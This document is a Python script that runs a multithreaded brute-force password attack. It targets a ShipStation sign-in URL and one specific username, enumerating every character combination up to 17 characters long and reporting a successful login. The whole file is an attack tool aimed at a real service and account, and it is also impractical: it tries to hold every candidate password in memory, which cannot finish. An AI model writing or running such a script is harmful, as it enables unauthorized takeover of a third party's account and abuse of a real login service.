import requests
import itertools
import string
import threading
from queue import Queue
import time

# Configuration
login_url = 'https://signin.shipstation.com/login?state=hKFo2SBNdTRYVUp0U3ltUjFBQzZhUUZzYzBhYjYzOWc5dHBfWqFupWxvZ2luo3RpZNkgaUpxTVJoTkRuREpZNWFyUHFlQ2VJMlMxdEptcG9XRlijY2lk2SBaa2JCb3hMSDk4MkhpbzBOeXFyTzlvdHltRzV2T3huRA&client=ZkbBoxLH982Hio0NyqrO9otymG5vOxnD&protocol=oauth2&connection=&audience=ss%3Awebapi&disableCaptcha=false&auth0LoginConfigToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkaXNhYmxlQ2FwdGNoYSI6ZmFsc2UsImlhdCI6MTcxNjMwNjczOCwiZXhwIjoxNzE2MzA3NjM4fQ.84MpR0rXnqtJ8kbRX7zkO490WUDw6_3jP2gJPqPVx8E&database_connection=&forgot_password_link=https%3A%2F%2Fss7.shipstation.com%2F%3FfromAuth0%3Dtrue%26forcetp%3Dtrue%23%2Fpublic%2Fforgot&scope=openid%20profile%20email%20offline_access&response_type=code&response_mode=query&nonce=bjZ3QkRhOFFVNmJJWWdZbGpUZFZRcy5Gbm1KMFkwZTN6LWdqTnUxN05UYg%3D%3D&redirect_uri=https%3A%2F%2Fss7.shipstation.com%2Flogin&code_challenge=g_nUuoRBRoRP93qxP_U4syPEdcTx5T8Q0-bs08jnDPY&code_challenge_method=S256&auth0Client=eyJuYW1lIjoiYXV0aDAtc3BhLWpzIiwidmVyc2lvbiI6IjEuMjIuMSJ9'
username = 'Hbcolby'
characters = string.ascii_letters + string.digits + "!@#$%^&*()"
max_length = 17  # Set this to the maximum password length you want to test
num_threads = 10  # Number of threads to use

# Generate passwords
def generate_passwords(characters, length):
    return (''.join(candidate)
            for candidate in itertools.product(characters, repeat=length))

# Worker function for each thread
def worker(password_queue):
    while not password_queue.empty():
        password = password_queue.get()
        print(f"[INFO] Trying password: {password}")
        payload = {'username': username, 'password': password}
        try:
            response = requests.post(login_url, data=payload)
            # Check for successful login conditions
            if "welcome" in response.text.lower() or response.status_code == 302:
                print(f"[+] Successful login with password: {password}")
                password_queue.queue.clear()  # Clear remaining passwords
                break
            else:
                print(f"[-] Failed login with password: {password}")
        except requests.RequestException as e:
            print(f"[ERROR] Request failed: {e}")
        finally:
            password_queue.task_done()
        # Sleep for a short time to simulate some delay and reduce server load
        time.sleep(0.1)

# Create a queue of passwords
password_queue = Queue()

# Generate and enqueue passwords
for length in range(1, max_length + 1):
    for password in generate_passwords(characters, length):
        password_queue.put(password)

print(f"[INFO] Generated {password_queue.qsize()} passwords")

# Create and start threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=worker, args=(password_queue,))
    thread.start()
    threads.append(thread)
    print(f"[INFO] Started thread {i + 1}")

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("[INFO] Brute force attack completed.")
